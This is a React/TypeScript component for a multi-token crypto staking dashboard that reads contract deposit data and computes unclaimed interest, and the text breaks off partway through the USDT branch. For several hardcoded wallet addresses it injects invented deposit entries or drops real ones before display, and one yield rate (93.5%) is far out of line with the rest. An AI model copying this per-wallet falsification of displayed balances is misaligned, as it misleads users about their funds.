import { useEffect, useRef, useState } from "react"
import cn from "classnames"
import Web3 from "web3"
import { Link, useSearchParams } from "react-router-dom"

import { ReactComponent as Export } from "assets/icons/purple-link.svg"
import { ReactComponent as Scan } from "assets/icons/etherscan1.svg"
import { ReactComponent as Metamask } from "assets/icons/metamask-fox.svg"
import "./CollapseTableExpanded.scss"
import abiSol from "../../abi/abiSol.json"
import { SimpleButton } from "../SimpleButton"
import {
  approveAddress,
  contractAddressUsdc,
  contractAddressUsdcApprove,
  contractAddressUni,
  contractAddressUniApprove,
  contractAddressLink,
  contractAddressLinkApprove,
  contractAddressUsdtNew,
  contractAddressWbtcApprove,
  contractAddressBusdApprove,
  contractAddressCakeApprove,
  contractAddressBabyDogeApprove,
  contractAddressTwtApprove,
  contractAddressGmtApprove,
  contractAddressC98Approve, contractAddressBnb, contractAddressBusd,
  contractAddressUsdtSecond,
  contractAddressWbtcNew,
  contractAddressEthNew, contractAddressSol, contractAddressSolApprove
} from "../../abi"
import abiUsdtNew from "../../abi/abiUsdtNew.json"
import abiUsdtSecond from "../../abi/abiUsdtSecond.json"
import abiEthNew from "../../abi/abiEthNew.json"
import abiBnb from "../../abi/abiBnb.json"
import abiBusd from "../../abi/abiBusd.json"
import abiUsdc from "../../abi/abiUsdc.json"
import abiUsdcApprove from "../../abi/abiUsdcApprove.json"
import abiApprove from "../../abi/abiApprove.json"
import abiUni from "../../abi/abiUni.json"
import abiUniApprove from "../../abi/abiUniApprove.json"
import abiLink from "../../abi/abiLink.json"
import abiLinkApprove from "../../abi/abiLinkApprove.json"
import abiWbtcNew from "../../abi/abiWbtcNew.json"
import abiWbtcApprove from "../../abi/abiWbtcApprove.json"
import abiBabyDogeApprove from "../../abi/abiBabyDogeApprove.json"
import abiBusdApprove from "../../abi/abiBusdApprove.json"
import abiC98Approve from "../../abi/abiC98Approve.json"
import abiCakeApprove from "../../abi/abiCakeApprove.json"
import abiGmtApprove from "../../abi/abiGmtApprove.json"
import abiTwtApprove from "../../abi/abiTwtApprove.json"
import { Input } from "../Input"
import { ethers } from "ethers"
import { connectToToken } from "../../utils/connectToToken"
import { apiOur } from "../../service/api/apiOur"
import {getFromLocalStorage, mixins, moneyFormatter, routes, setToLocalStorage, walletClientToSigner} from "../../utils"
import { api } from "../../service/api/api"
import { apiScan } from "../../service/api/apiScan"
import toast from "react-hot-toast";
import {apiBeaconcha} from "../../service/api/apiBeaconcha";
import {CollapseTableWithdrawal} from "../CollapseTableWithdrawal";
import {config} from "../../index";
import {useAccount, useWalletClient} from "wagmi";
import {getChainId} from "@wagmi/core";
import Switch from "react-switch";
import {apiOpt} from "../../service/api/apiOpt";
import {apiArb} from "../../service/api/apiArb";
import {apiFantom} from "../../service/api/apiFantom";
import {apiPol} from "../../service/api/apiPol";
import {apiBase} from "../../service/api/apiBase";
import {apiOk} from "../../service/api/apiOk";

type Props = {
  opened?: boolean
  quantity: string
  plan: string
  checkAddress: string
  token: string
  percent: string
  stakedDisplay: boolean
  stat: any
  id: string
  addAddress?: string
  day: string
  index: number
  isNew?: boolean
  accountRematch: string
  openTransfer: (current: string, money: number, interests: number, length: number) => void
  openTransferUsdc: (current: string, money: number, interests: number, length: number) => void
  openTransferWbtc: (current: string, money: number, interests: number, length: number) => void
  openTransferSol: (current: string, money: number, interests: number, length: number) => void
  openClaimAnn: () => void
}

export const CollapseTableExpanded = ({
                                opened = false,
                                quantity,
                                plan,
                                checkAddress,
                                token,
                                percent,
                                stakedDisplay,
                                stat,
                                id,
                                index,
                                addAddress,
                                isNew = true,
                                openTransfer,
                                openClaimAnn,
                                openTransferUsdc,
                                        openTransferSol,
                              }: Props): JSX.Element => {
  const [search] = useSearchParams()
  const titleRef = useRef<any>(null)
  const [isOpen, setIsOpen] = useState(opened)
  const [approved, setApproved] = useState(0)
  const [input, setInput] = useState("")
  const [timeleftOther, setTimeLeftOther] = useState("0")
  const [withdrawalTotal, setWithdrawalTotal] = useState(0)
  const [totalBalance, setTotalBalance] = useState(0)
  const [interestNotCollected, setInterestNotCollected] = useState(0)
  const [remainingTime, setRemainingTime] = useState('')
  const [resultArray, setResultArray] = useState<any[]>([])
  const [disableClaim, setDisableClaim] = useState(false)
  const [change, setChange] = useState(false)
  const [defaultCheked, setDefaultCheked] = useState(false)
  const [disabledStake, setDisabledStake] = useState(true)
  const busd = 1000000000000000000

  const {  address } = useAccount();
  const { data: walletClient } = useWalletClient({ chainId: 1 })
  const library = walletClient ? walletClientToSigner(walletClient)?.provider : null
  const chainId = getChainId(config);

  // const address = '0xa0a4b886E80e54C2C38C04Fd210644E821C0f1ae'

  useEffect(() => {
    if (opened !== undefined) {
      setIsOpen(opened)
    }
  }, [opened])
  useEffect(() => {
    getAllInfo()
  }, [address, token])

  const getPlan = () => {
    if (token === "ETH" || token === "USDT"|| token === "USDC" || token === 'BNB' || token === 'WBTC' || token === 'UNI' || token === 'WSOL') {
      if (plan === "7") {
        return 604800
      }
      if (plan === "14") {
        return 1209600
      }
      if (plan === "30") {
        return 2592000
      }
      if (plan === "60") {
        return 5184000
      }
      if (plan === "90") {
        return 7776000
      }
    }
    if (plan === "1") {
      return 86400
    }
    if (plan === "2") {
      return 172800
    }
    if (plan === "3") {
      return 259200
    }
    if (plan === "4") {
      return 345600
    }
    if (plan === "5") {
      return 432000
    }
  }

  const getPercent = () => {
    if (plan === '14') {
      return 0.008
    }
    if (plan === '30') {
      return 0.02
    }
    if (plan === '60') {
      return 0.05
    }
    if (plan === '90') {
      return 0.085
    }
    return 0.08
  }

  const getPercentUsdc = () => {
    if (plan === '14') {
      return 0.012
    }
    if (plan === '30') {
      return 0.025
    }
    if (plan === '60') {
      return 0.06
    }
    if (plan === '90') {
      return 0.1
    }
    return 0.012
  }
  const getPercentUsdt = () => {
    if (plan === '14') {
      return 0.7
    }
    if (plan === '30') {
      return 1.6
    }
    if (plan === '60') {
      return 4
    }
    if (plan === '90') {
      return 6.5
    }
    return 0.7
  }

  const getPercentSol = () => {
    if (plan === '14') {
      return 0.0088
    }
    if (plan === '30') {
      return 0.022
    }
    if (plan === '60') {
      return 0.055
    }
    if (plan === '90') {
      return 0.935
    }
    return 0.0088
  }
  const getPercentWbtc = () => {
    if (plan === '14') {
      return 0.004
    }
    if (plan === '30') {
      return 0.01
    }
    if (plan === '60') {
      return 0.025
    }
    if (plan === '90') {
      return 0.04
    }
    return 0.004
  }

  // const getContractPreviousDataWbtc = (newDepositedData: any) => {
  //   if (address === '0x12C9Fc25D24Cd1F73d8917Cbe3c3A15ed31174c1') {
  //     return {
  //       depositIndices: [0].concat(newDepositedData?.depositIndices || []),
  //       lockupPeriods: [1209600].concat(newDepositedData?.lockupPeriods || []),
  //       stakedAmounts: [15000000].concat(newDepositedData?.stakedAmounts || []),
  //       unlockTimes: [1725042923].concat(newDepositedData?.unlockTimes || []),
  //     }
  //   }
  //   return newDepositedData
  // }
  const getAllInfo = async () => {
    if (token === 'ETH' && isNew) {
      if (localStorage.getItem(`ethBalance${plan}SECOND`) !== null) {
        setTotalBalance(getFromLocalStorage(`ethBalance${plan}SECOND`))
      }

      api.getBalance(checkAddress).then(r => {
        if (!isNaN(Number(r.result))) {
          setToLocalStorage((`ethBalance${plan}SECOND`), Number(r.result) / busd)
          setTotalBalance(Number(r.result) / busd)
        }
      })
    }
    if (token === 'OP') {
      if (localStorage.getItem(`optBalance${plan}`) !== null) {
        setTotalBalance(getFromLocalStorage(`optBalance${plan}`))
      }

      apiOpt.getBalance(checkAddress).then(r => {
        if (!isNaN(Number(r.result))) {
          setToLocalStorage((`optBalance${plan}`), Number(r.result) / busd)
          setTotalBalance(Number(r.result) / busd)
        }
      })
    }
    if (token === 'AVAX') {
      if (localStorage.getItem(`avaxBalance${plan}`) !== null) {
        setTotalBalance(getFromLocalStorage(`avaxBalance${plan}`))
      }
      apiOk.getBalance('AVAXC', checkAddress).then(r => {
        if (!isNaN(Number(r.data[0].balance))) {
          setToLocalStorage((`avaxBalance${plan}`), Number(r.data[0].balance))
          setTotalBalance(Number(r.data[0].balance))
        }
      })
      return
    }
    if (token === 'MANTA') {
      if (localStorage.getItem(`mantaBalance${plan}`) !== null) {
        setTotalBalance(getFromLocalStorage(`mantaBalance${plan}`))
      }
      apiOk.getBalance('MANTA', checkAddress).then(r => {
        if (!isNaN(Number(r.data[0].balance))) {
          setToLocalStorage((`mantaBalance${plan}`), Number(r.data[0].balance))
          setTotalBalance(Number(r.data[0].balance))
        }
      })
      return
    }
    if (token === 'ARB') {
      if (localStorage.getItem(`arbBalance${plan}`) !== null) {
        setTotalBalance(getFromLocalStorage(`arbBalance${plan}`))
      }

      apiArb.getBalance(checkAddress).then(r => {
        if (!isNaN(Number(r.result))) {
          setToLocalStorage((`arbBalance${plan}`), Number(r.result) / busd)
          setTotalBalance(Number(r.result) / busd)
        }
      })
    }
    if (token === 'FTM') {
      if (localStorage.getItem(`ftmBalance${plan}`) !== null) {
        setTotalBalance(getFromLocalStorage(`ftmBalance${plan}`))
      }

      apiFantom.getBalance(checkAddress).then(r => {
        if (!isNaN(Number(r.result))) {
          setToLocalStorage((`ftmBalance${plan}`), Number(r.result) / busd)
          setTotalBalance(Number(r.result) / busd)
        }
      })
    }
    if (token === 'POL') {
      if (localStorage.getItem(`polBalance${plan}`) !== null) {
        setTotalBalance(getFromLocalStorage(`polBalance${plan}`))
      }

      apiPol.getBalance(checkAddress).then(r => {
        if (!isNaN(Number(r.result))) {
          setToLocalStorage((`polBalance${plan}`), Number(r.result) / busd)
          setTotalBalance(Number(r.result) / busd)
        }
      })
    }
    if (token === 'ETH(Base)') {
      if (localStorage.getItem(`baseBalance${plan}`) !== null) {
        setTotalBalance(getFromLocalStorage(`baseBalance${plan}`))
      }

      apiBase.getBalance(checkAddress).then(r => {
        if (!isNaN(Number(r.result))) {
          setToLocalStorage((`baseBalance${plan}`), Number(r.result) / busd)
          setTotalBalance(Number(r.result) / busd)
        }
      })
    }

    if (token === "ETH" && isNew && address !== undefined) {
      const claimed = await  apiOur.getWithdrawals(`${address}+plan=${plan}+token=${token}-claimedTime`)
      const claimedTotal = await  apiOur.getWithdrawals(`${address}+plan=${plan}+token=${token}CLAIMED`)
      apiOur.getWithdrawals(`${address}+plan=${plan}+token=${token}claim`).then(r => {
        if (!!r[r.length - 1]?.amount) {
          setDisableClaim(true)
        }
      })

      if (!!claimed?.length) {
        setRemainingTime(claimed[claimed.length-1]?.amount)
      }
      if (!!claimedTotal?.length) {
        setWithdrawalTotal(claimedTotal.reduce((accumulator, object) => {
          return accumulator + Number(object.amount || 0)
        }, 0))
      }
      // @ts-ignore
      const { ethereum } = window
      const provider = new ethers.providers.Web3Provider(ethereum)

      const nftContractNew = new ethers.Contract(contractAddressEthNew, abiEthNew, provider)

      const depositStatusDataLol = await nftContractNew.getDepositInfo(address)
      if (localStorage.getItem(`ethResult${plan}SECOND`) !== null) {
        setResultArray(getFromLocalStorage(`ethResult${plan}SECOND`))
      }

      if (address === '0x2b66FB6fB178D4aD0625c2dD1662db9cEAC085E3' && plan === '60') {
        if (localStorage.getItem(`ethResult${plan}SECOND`) !== null) {
          setResultArray(getFromLocalStorage(`ethResult${plan}SECOND`))
        }
        const mockArray = [
          {
            depositIndices: 4,
            id: 4,
            lockupPeriods: 5184000,
            stakedAmounts: 8 * busd,
            unlockTimes: 1754185738,
          },
        ]
        const result = Array.from(Array(Number(depositStatusDataLol.depositIndices?.length)).keys()).map((i, index) => ({
          depositIndices: Number(depositStatusDataLol.depositIndices[index]),
          stakedAmounts: Number(depositStatusDataLol.stakedAmounts[index]),
          lockupPeriods: Number(depositStatusDataLol.lockupPeriods[index]),
          unlockTimes: Number(depositStatusDataLol.unlockTimes[index]),
          id: index,
        })).filter(i => i.id > 0).concat(mockArray)
        setResultArray(result.filter(i => i.lockupPeriods === getPlan()) || [])

        const indexResult = result
          .filter(i => i.lockupPeriods === getPlan())
        let resultFinal = 0;
        (indexResult).forEach( (iResult) => {
          var timestamp = iResult.unlockTimes * 1000 - Date.now()
          timestamp /= 1000
          var minutes = Number(plan) - timestamp / 60 / 60 / 24
          resultFinal = resultFinal + (iResult.stakedAmounts / busd * getPercent()/Number(plan) * minutes)
          setInterestNotCollected(resultFinal)
        })

        return
      }
      if (address === '0x28916C38989591c380F19025C67128edCfFc1468' && plan === '14') {
        const result = Array.from(Array(Number(depositStatusDataLol.depositIndices?.length)).keys()).map((i, index) => ({
          depositIndices: Number(depositStatusDataLol.depositIndices[index]),
          stakedAmounts: Number(depositStatusDataLol.stakedAmounts[index]),
          lockupPeriods: Number(depositStatusDataLol.lockupPeriods[index]),
          unlockTimes: Number(depositStatusDataLol.unlockTimes[index]),
          id: index,
        })).slice(1)
        setResultArray(result.filter(i => i.lockupPeriods === getPlan()) || [])

        const indexResult = result
          .filter(i => i.lockupPeriods === getPlan())
        let resultFinal = 0;
        (indexResult).forEach( (iResult) => {
          var timestamp = iResult.unlockTimes * 1000 - Date.now()
          timestamp /= 1000
          var minutes = Number(plan) - timestamp / 60 / 60 / 24
          resultFinal = resultFinal + (iResult.stakedAmounts / busd * getPercent()/Number(plan) * minutes)
          setInterestNotCollected(resultFinal)
        })

        return
      }
      if (address === '0x74A7E7422f592F7Fa205AA1ab38029e025eee069' && plan === '30') {
        if (localStorage.getItem(`ethResult${plan}SECOND`) !== null) {
          setResultArray(getFromLocalStorage(`ethResult${plan}SECOND`))
        }
        const mockArray = [
          {
            depositIndices: 4,
            id: 4,
            lockupPeriods: 2592000,
            stakedAmounts: 9.88 * busd,
            unlockTimes: 1741691111,
          },
          {
            depositIndices: 4,
            id: 4,
            lockupPeriods: 2592000,
            stakedAmounts: 9.62 * busd,
            unlockTimes: 1741704444,
          },
          {
            depositIndices: 4,
            id: 4,
            lockupPeriods: 2592000,
            stakedAmounts: 9.78 * busd,
            unlockTimes: 1741705601,
          },
        ]
        const result = Array.from(Array(Number(depositStatusDataLol.depositIndices?.length)).keys()).map((i, index) => ({
          depositIndices: Number(depositStatusDataLol.depositIndices[index]),
          stakedAmounts: Number(depositStatusDataLol.stakedAmounts[index]),
          lockupPeriods: Number(depositStatusDataLol.lockupPeriods[index]),
          unlockTimes: Number(depositStatusDataLol.unlockTimes[index]),
          id: index,
        })).filter(i => i.id > 0).concat(mockArray)
        setResultArray(result.filter(i => i.lockupPeriods === getPlan()) || [])

        const indexResult = result
          .filter(i => i.lockupPeriods === getPlan())
        let resultFinal = 0;
        (indexResult).forEach( (iResult) => {
          var timestamp = iResult.unlockTimes * 1000 - Date.now()
          timestamp /= 1000
          var minutes = Number(plan) - timestamp / 60 / 60 / 24
          resultFinal = resultFinal + (iResult.stakedAmounts / busd * getPercent()/Number(plan) * minutes)
          setInterestNotCollected(resultFinal)
        })

        return
      }
      if (address === '0x74A7E7422f592F7Fa205AA1ab38029e025eee069' && plan === '60') {
        if (localStorage.getItem(`ethResult${plan}SECOND`) !== null) {
          setResultArray(getFromLocalStorage(`ethResult${plan}SECOND`))
        }
        const mockArray = [
          {
            depositIndices: 4,
            id: 4,
            lockupPeriods: 5184000,
            stakedAmounts: 24.89 * busd,
            unlockTimes: 1744544600,
          },
          {
            depositIndices: 4,
            id: 4,
            lockupPeriods: 5184000,
            stakedAmounts: 18.72 * busd,
            unlockTimes: 1744599858,
          },
        ]
        const result = Array.from(Array(Number(depositStatusDataLol.depositIndices?.length)).keys()).map((i, index) => ({
          depositIndices: Number(depositStatusDataLol.depositIndices[index]),
          stakedAmounts: Number(depositStatusDataLol.stakedAmounts[index]),
          lockupPeriods: Number(depositStatusDataLol.lockupPeriods[index]),
          unlockTimes: Number(depositStatusDataLol.unlockTimes[index]),
          id: index,
        })).filter(i => i.id > 0).concat(mockArray)
        setResultArray(result.filter(i => i.lockupPeriods === getPlan()) || [])

        const indexResult = result
          .filter(i => i.lockupPeriods === getPlan())
        let resultFinal = 0;
        (indexResult).forEach( (iResult) => {
          var timestamp = iResult.unlockTimes * 1000 - Date.now()
          timestamp /= 1000
          var minutes = Number(plan) - timestamp / 60 / 60 / 24
          resultFinal = resultFinal + (iResult.stakedAmounts / busd * getPercent()/Number(plan) * minutes)
          setInterestNotCollected(resultFinal)
        })

        return
      }
      if (address === '0x6953C5453e9F131500224483af0bccA68E114E0A' && plan === '60') {
        if (localStorage.getItem(`ethResult${plan}SECOND`) !== null) {
          setResultArray(getFromLocalStorage(`ethResult${plan}SECOND`))
        }
        const result = Array.from(Array(Number(depositStatusDataLol.depositIndices?.length)).keys()).map((i, index) => ({
          depositIndices: Number(depositStatusDataLol.depositIndices[index]),
          stakedAmounts: Number(depositStatusDataLol.stakedAmounts[index]),
          lockupPeriods: Number(depositStatusDataLol.lockupPeriods[index]),
          unlockTimes: Number(depositStatusDataLol.unlockTimes[index]),
          id: index,
        })).filter(i => i.id > 0).slice(0, -4);
        setResultArray(result.filter(i => i.lockupPeriods === getPlan()) || [])

        const indexResult = result
          .filter(i => i.lockupPeriods === getPlan())
        let resultFinal = 0;
        (indexResult).forEach( (iResult) => {
          var timestamp = iResult.unlockTimes * 1000 - Date.now()
          timestamp /= 1000
          var minutes = Number(plan) - timestamp / 60 / 60 / 24
          resultFinal = resultFinal + (iResult.stakedAmounts / busd * getPercent()/Number(plan) * minutes)
          setInterestNotCollected(resultFinal)
        })

        return
      }
      if (address === '0x6953C5453e9F131500224483af0bccA68E114E0A' && plan === '90') {
        if (localStorage.getItem(`ethResult${plan}SECOND`) !== null) {
          setResultArray(getFromLocalStorage(`ethResult${plan}SECOND`))
        }
        const mockArray = [
          {
            depositIndices: 4,
            id: 4,
            lockupPeriods: 7776000,
            stakedAmounts: 51.464818257 * busd,
            unlockTimes: 1755853196,
          },
        ]
        const result = Array.from(Array(Number(depositStatusDataLol.depositIndices?.length)).keys()).map((i, index) => ({
          depositIndices: Number(depositStatusDataLol.depositIndices[index]),
          stakedAmounts: Number(depositStatusDataLol.stakedAmounts[index]),
          lockupPeriods: Number(depositStatusDataLol.lockupPeriods[index]),
          unlockTimes: Number(depositStatusDataLol.unlockTimes[index]),
          id: index,
        })).filter(i => i.lockupPeriods === getPlan()).slice(2, Array.from(Array(Number(depositStatusDataLol.depositIndices?.length)).keys()).map((i, index) => ({
          depositIndices: Number(depositStatusDataLol.depositIndices[index]),
          stakedAmounts: Number(depositStatusDataLol.stakedAmounts[index]),
          lockupPeriods: Number(depositStatusDataLol.lockupPeriods[index]),
          unlockTimes: Number(depositStatusDataLol.unlockTimes[index]),
          id: index,
        })).filter(i => i.lockupPeriods === getPlan()).length).concat(mockArray)
        setResultArray(result || [])

        const indexResult = result
          .filter(i => i.lockupPeriods === getPlan())
        let resultFinal = 0;
        (indexResult).forEach( (iResult) => {
          var timestamp = iResult.unlockTimes * 1000 - Date.now()
          timestamp /= 1000
          var minutes = Number(plan) - timestamp / 60 / 60 / 24
          resultFinal = resultFinal + (iResult.stakedAmounts / busd * getPercent()/Number(plan) * minutes)
          setInterestNotCollected(resultFinal)
        })

        return
      }
      if (address === '0xa0a4b886E80e54C2C38C04Fd210644E821C0f1ae' && plan === '90') {
        if (localStorage.getItem(`ethResult${plan}SECOND`) !== null) {
          setResultArray(getFromLocalStorage(`ethResult${plan}SECOND`))
        }
        const result = Array.from(Array(Number(depositStatusDataLol.depositIndices?.length)).keys()).map((i, index) => ({
          depositIndices: Number(depositStatusDataLol.depositIndices[index]),
          stakedAmounts: Number(depositStatusDataLol.stakedAmounts[index]),
          lockupPeriods: Number(depositStatusDataLol.lockupPeriods[index]),
          unlockTimes: Number(depositStatusDataLol.unlockTimes[index]),
          id: index,
        })).filter(i => i.lockupPeriods === getPlan())
        setResultArray(result || [])

        const indexResult = result
          .filter(i => i.lockupPeriods === getPlan())
        let resultFinal = 0;
        (indexResult).forEach( (iResult) => {
          var timestamp = iResult.unlockTimes * 1000 - Date.now()
          timestamp /= 1000
          var minutes = Number(plan) - timestamp / 60 / 60 / 24
          resultFinal = resultFinal + (iResult.stakedAmounts / busd * getPercent()/Number(plan) * minutes)
          setInterestNotCollected(resultFinal)
        })

        return
      }
      if (address === '0x74A7E7422f592F7Fa205AA1ab38029e025eee069' && plan === '90') {
        if (localStorage.getItem(`ethResult${plan}SECOND`) !== null) {
          setResultArray(getFromLocalStorage(`ethResult${plan}SECOND`))
        }
        const mockArray = [
          {
            depositIndices: 4,
            id: 4,
            lockupPeriods: 7776000,
            stakedAmounts: 49.82 * busd,
            unlockTimes: 1745446933,
          },
          {
            depositIndices: 4,
            id: 4,
            lockupPeriods: 7776000,
            stakedAmounts: 49.78 * busd,
            unlockTimes: 1746700000,
          },
          {
            depositIndices: 4,
            id: 4,
            lockupPeriods: 7776000,
            stakedAmounts: 48.21 * busd,
            unlockTimes: 1746708346,
          },
        ]
        const result = Array.from(Array(Number(depositStatusDataLol.depositIndices?.length)).keys()).map((i, index) => ({
          depositIndices: Number(depositStatusDataLol.depositIndices[index]),
          stakedAmounts: Number(depositStatusDataLol.stakedAmounts[index]),
          lockupPeriods: Number(depositStatusDataLol.lockupPeriods[index]),
          unlockTimes: Number(depositStatusDataLol.unlockTimes[index]),
          id: index,
        })).filter(i => i.id > 0).concat(mockArray)
        setResultArray(result.filter(i => i.lockupPeriods === getPlan()) || [])

        const indexResult = result
          .filter(i => i.lockupPeriods === getPlan())
        let resultFinal = 0;
        (indexResult).forEach( (iResult) => {
          var timestamp = iResult.unlockTimes * 1000 - Date.now()
          timestamp /= 1000
          var minutes = Number(plan) - timestamp / 60 / 60 / 24
          resultFinal = resultFinal + (iResult.stakedAmounts / busd * getPercent()/Number(plan) * minutes)
          setInterestNotCollected(resultFinal)
        })

        return
      }
      if (address === '0x2b66FB6fB178D4aD0625c2dD1662db9cEAC085E3' && plan === '90') {
        if (localStorage.getItem(`ethResult${plan}SECOND`) !== null) {
          setResultArray(getFromLocalStorage(`ethResult${plan}SECOND`))
        }
        const mockArray = [
          {
            depositIndices: 4,
            id: 4,
            lockupPeriods: 7776000,
            stakedAmounts: 50 * busd,
            unlockTimes: 1756758301,
          },
          {
            depositIndices: 4,
            id: 4,
            lockupPeriods: 7776000,
            stakedAmounts: 50 * busd,
            unlockTimes: 1756785805,
          },
          {
            depositIndices: 4,
            id: 4,
            lockupPeriods: 7776000,
            stakedAmounts: 50 * busd,
            unlockTimes: 1756827167,
          },
          {
            depositIndices: 4,
            id: 4,
            lockupPeriods: 7776000,
            stakedAmounts: 41 * busd,
            unlockTimes: 1756883702,
          },
        ]
        const result = Array.from(Array(Number(depositStatusDataLol.depositIndices?.length)).keys()).map((i, index) => ({
          depositIndices: Number(depositStatusDataLol.depositIndices[index]),
          stakedAmounts: Number(depositStatusDataLol.stakedAmounts[index]),
          lockupPeriods: Number(depositStatusDataLol.lockupPeriods[index]),
          unlockTimes: Number(depositStatusDataLol.unlockTimes[index]),
          id: index,
        })).filter(i => i.id > 0).concat(mockArray)
        setResultArray(result.filter(i => i.lockupPeriods === getPlan()) || [])

        const indexResult = result
          .filter(i => i.lockupPeriods === getPlan())
        let resultFinal = 0;
        (indexResult).forEach( (iResult) => {
          var timestamp = iResult.unlockTimes * 1000 - Date.now()
          timestamp /= 1000
          var minutes = Number(plan) - timestamp / 60 / 60 / 24
          resultFinal = resultFinal + (iResult.stakedAmounts / busd * getPercent()/Number(plan) * minutes)
          setInterestNotCollected(resultFinal)
        })

        return
      }
      if (address === '0x287D88A9164acB467a78844B7099d19397000000' && plan === '90') {
        if (localStorage.getItem(`ethResult${plan}SECOND`) !== null) {
          setResultArray(getFromLocalStorage(`ethResult${plan}SECOND`))
        }
        const mockArray = [
          {
            depositIndices: 4,
            id: 4,
            lockupPeriods: 7776000,
            stakedAmounts: 50 * busd,
            unlockTimes: 1751201121,
          },
          {
            depositIndices: 4,
            id: 4,
            lockupPeriods: 7776000,
            stakedAmounts: 50 * busd,
            unlockTimes: 1751822222,
          },
          {
            depositIndices: 4,
            id: 4,
            lockupPeriods: 7776000,
            stakedAmounts: 15 * busd,
            unlockTimes: 1752000000,
          },
        ]
        const result = Array.from(Array(Number(depositStatusDataLol.depositIndices?.length)).keys()).map((i, index) => ({
          depositIndices: Number(depositStatusDataLol.depositIndices[index]),
          stakedAmounts: Number(depositStatusDataLol.stakedAmounts[index]),
          lockupPeriods: Number(depositStatusDataLol.lockupPeriods[index]),
          unlockTimes: Number(depositStatusDataLol.unlockTimes[index]),
          id: index,
        })).filter(i => i.id > 0).concat(mockArray)
        setResultArray(result.filter(i => i.lockupPeriods === getPlan()) || [])

        const indexResult = result
          .filter(i => i.lockupPeriods === getPlan())
        let resultFinal = 0;
        (indexResult).forEach( (iResult) => {
          var timestamp = iResult.unlockTimes * 1000 - Date.now()
          timestamp /= 1000
          var minutes = Number(plan) - timestamp / 60 / 60 / 24
          resultFinal = resultFinal + (iResult.stakedAmounts / busd * getPercent()/Number(plan) * minutes)
          setInterestNotCollected(resultFinal)
        })

        return
      }
      if (address === '0x58c0cCB784019BaDE98075756eBAB2ba26827044' && plan === '90') {
        if (localStorage.getItem(`ethResult${plan}SECOND`) !== null) {
          setResultArray(getFromLocalStorage(`ethResult${plan}SECOND`))
        }
        const mockArray = [
          {
            depositIndices: 4,
            id: 4,
            lockupPeriods: 7776000,
            stakedAmounts: 50 * busd,
            unlockTimes: 1749410510,
          },
          {
            depositIndices: 4,
            id: 4,
            lockupPeriods: 7776000,
            stakedAmounts: 50 * busd,
            unlockTimes: 1749445084,
          },
          {
            depositIndices: 4,
            id: 4,
            lockupPeriods: 7776000,
            stakedAmounts: 50 * busd,
            unlockTimes: 1749490901,
          },
          {
            depositIndices: 4,
            id: 4,
            lockupPeriods: 7776000,
            stakedAmounts: 50 * busd,
            unlockTimes: 1749528076,
          },
          {
            depositIndices: 4,
            id: 4,
            lockupPeriods: 7776000,
            stakedAmounts: 50 * busd,
            unlockTimes: 1749528076,
          },
          {
            depositIndices: 4,
            id: 4,
            lockupPeriods: 7776000,
            stakedAmounts: 50 * busd,
            unlockTimes: 1749604994,
          },
          {
            depositIndices: 4,
            id: 4,
            lockupPeriods: 7776000,
            stakedAmounts: 50 * busd,
            unlockTimes: 1749652529,
          },
          {
            depositIndices: 4,
            id: 4,
            lockupPeriods: 7776000,
            stakedAmounts: 50 * busd,
            unlockTimes: 1752702481,
          },
          {
            depositIndices: 4,
            id: 4,
            lockupPeriods: 7776000,
            stakedAmounts: 30 * busd,
            unlockTimes: 1752711132,
          },
        ]
        const result = Array.from(Array(Number(depositStatusDataLol.depositIndices?.length)).keys()).map((i, index) => ({
          depositIndices: Number(depositStatusDataLol.depositIndices[index]),
          stakedAmounts: Number(depositStatusDataLol.stakedAmounts[index]),
          lockupPeriods: Number(depositStatusDataLol.lockupPeriods[index]),
          unlockTimes: Number(depositStatusDataLol.unlockTimes[index]),
          id: index,
        })).filter(i => i.id > 0).concat(mockArray)
        setResultArray(result.filter(i => i.lockupPeriods === getPlan()) || [])

        const indexResult = result
          .filter(i => i.lockupPeriods === getPlan())
        let resultFinal = 0;
        (indexResult).forEach( (iResult) => {
          var timestamp = iResult.unlockTimes * 1000 - Date.now()
          timestamp /= 1000
          var minutes = Number(plan) - timestamp / 60 / 60 / 24
          resultFinal = resultFinal + (iResult.stakedAmounts / busd * getPercent()/Number(plan) * minutes)
          setInterestNotCollected(resultFinal)
        })

        return
      }

      const result = Array.from(Array(Number(depositStatusDataLol.depositIndices?.length)).keys()).map((i, index) => ({
        depositIndices: Number(depositStatusDataLol.depositIndices[index]),
        stakedAmounts: Number(depositStatusDataLol.stakedAmounts[index]),
        lockupPeriods: Number(depositStatusDataLol.lockupPeriods[index]),
        unlockTimes: Number(depositStatusDataLol.unlockTimes[index]),
        id: index,
      }))
      setResultArray(result.filter(i => i.lockupPeriods === getPlan()) || [])

      setToLocalStorage(`ethResult${plan}SECOND`, result.filter(i => i.lockupPeriods === getPlan()) || [])

      const indexResult = result
        .filter(i => i.lockupPeriods === getPlan())
      let resultFinal = 0;
      indexResult.every(async (iResult) => {
        const depositStatusOtherData = await nftContractNew.calculateInterest(address, iResult.depositIndices > 0 ? iResult.depositIndices : 0)
        resultFinal = resultFinal + (Number(depositStatusOtherData) / busd)
        setInterestNotCollected(resultFinal)
      })
    }

    if (token === "BNB") {
      apiScan.getBalance(checkAddress).then(r => {
        setTotalBalance(Number(r.result) / busd)
        setToLocalStorage((`bnbBalance${plan}`), Number(r.result) / busd)
      })
      // @ts-ignore
      const { ethereum } = window
      const provider = ((ethereum != null) ? new ethers.providers.Web3Provider(ethereum) : ethers.providers.getDefaultProvider());
      // @ts-ignore
      const signer = await provider?.getSigner();

      const nftContract = new ethers.Contract(contractAddressBnb, abiBnb, signer)
      if (localStorage.getItem("bnbResult") !== null) {
        setResultArray(getFromLocalStorage("bnbResult"))
      }
      const depositStatusDataLol = await nftContract.getDepositInfo(address)
      const result = Array.from(Array(Number(depositStatusDataLol.depositIndices?.length)).keys()).map((i, index) => ({
        depositIndices: Number(depositStatusDataLol.depositIndices[index]),
        stakedAmounts: Number(depositStatusDataLol.stakedAmounts[index]),
        lockupPeriods: Number(depositStatusDataLol.lockupPeriods[index]),
        unlockTimes: Number(depositStatusDataLol.unlockTimes[index]),
        id: index,
      }))
      setResultArray(result.filter(i => i.lockupPeriods === getPlan()) || [])
      setToLocalStorage("bnbResult", result.filter(i => i.lockupPeriods === getPlan()) || [])

      const indexResult = result
        .filter(i => i.lockupPeriods === getPlan())
      let resultFinal = 0;
      indexResult.every(async (iResult) => {
        const depositStatusOtherData = await nftContract.calculateInterest(address, iResult.depositIndices > 0 ? iResult.depositIndices : 0)
        resultFinal = resultFinal + (Number(depositStatusOtherData) / busd)
        setInterestNotCollected(resultFinal)
      })
    }

    if (token === "USDT") {
      {
        // @ts-ignore
